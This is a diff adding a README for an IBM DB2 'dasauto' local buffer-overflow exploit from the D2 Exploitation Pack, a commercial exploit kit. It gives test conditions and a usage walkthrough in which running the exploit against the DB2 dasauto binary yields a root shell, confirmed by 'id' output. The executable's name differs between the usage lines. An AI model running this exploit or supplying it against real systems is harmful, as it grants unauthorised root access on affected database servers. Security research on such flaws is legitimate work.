@@ -1,0 +1,36 @@
+D2 Exploitation Pack
+====================
+
+Copyright (c) 2007-2009 DSquare Security, LLC
+
+License information
+-------------------
+
+See the file "LICENSE.txt" for information on the history of this
+software, terms & conditions for usage, and a DISCLAIMER OF ALL
+WARRANTIES.
+
+Local exploit
+---------------
+
+IBM DB2 Universal Database dasauto Buffer Overflow Vulnerability
+
+Tested on Debian 4.0 with /proc/sys/kernel/randomize_va_space = 0
+and with IBM DB2 9.1
+
+References:
+http://www.securityfocus.com/bid/22677
+
+How to use the exploit
+------------------------
+
+$ ./d2sec_dasauto 
+D2SEC (c) 2007-2009 IBM DB2 dasauto exploit
+
+Usage: /tmp/d2sec_db2dasrrm <dasauto pathname>
+$ ./d2sec_db2dasrrm /opt/ibm/db2/V9.1/das/adm/dasauto
+D2SEC (c) 2007-2009 IBM DB2 dasauto exploit
+
+sh-3.1# id
+uid=0(root) gid=0(root) groups=20(dialout),24(cdrom),25(floppy),29(audio),44(video),46(plugdev),1000(compaq)
+
